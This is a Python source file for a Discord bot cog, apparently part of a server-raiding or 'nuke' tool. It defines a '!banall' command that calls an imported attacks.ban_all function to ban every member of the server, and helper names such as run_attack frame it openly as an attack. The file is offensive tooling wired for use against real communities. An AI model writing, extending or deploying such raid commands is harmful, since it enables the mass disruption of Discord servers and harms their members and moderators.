"""!banall - ban every member in the server."""

import discord
from discord.ext import commands

from core import attacks
from .common import run_attack, token


class BanAll(commands.Cog):
    """ban every member in the server."""

    @commands.command(name="banall")
    async def banall(self, ctx: commands.Context):
        """ban every member in the server."""
        await run_attack(
            ctx, "Ban All",
            lambda g: attacks.ban_all(token(), g.id))


async def setup(bot: commands.Bot):
    await bot.add_cog(BanAll())
